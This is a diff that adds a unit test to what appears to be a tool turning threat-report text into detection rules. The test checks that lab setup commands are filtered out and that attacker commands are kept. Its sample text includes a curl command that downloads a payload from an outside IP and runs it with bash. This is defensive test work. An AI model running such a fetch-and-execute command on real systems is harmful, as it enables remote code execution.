@@ -170,3 +170,22 @@ def test_linux_markers_fallback_includes_unix_on_windows_hunt() -> None:
         doc = yaml.safe_load(rule.rule_yaml)
         if "/nsenter" in rule.rule_yaml or "/bpftool" in rule.rule_yaml:
             assert doc["logsource"]["product"] == "linux"
+
+
+def test_lab_harness_and_setup_commands_are_filtered() -> None:
+    """docker compose up, localhost health checks, and test harnesses must not become rules."""
+    text = (
+        "Adversaries exploited the target. Setup the environment using docker compose up -d "
+        "and test with curl -s localhost:8010/__lab/status. Then adversary executed "
+        "curl http://193.29.224.151/payload.bin -o /tmp/loader and bash /tmp/loader."
+    )
+    cmds = observed_commands(text, platforms=["Linux"])
+    cmd_lines = [c.command for c in cmds]
+    # Lab harness commands are stripped
+    assert not any("docker" in cl for cl in cmd_lines)
+    assert not any("localhost" in cl for cl in cmd_lines)
+    assert not any("__lab" in cl for cl in cmd_lines)
+
+    # Legitimate malicious actions remain
+    assert any("193.29.224.151" in cl for cl in cmd_lines)
+    assert any("bash" in cl for cl in cmd_lines)
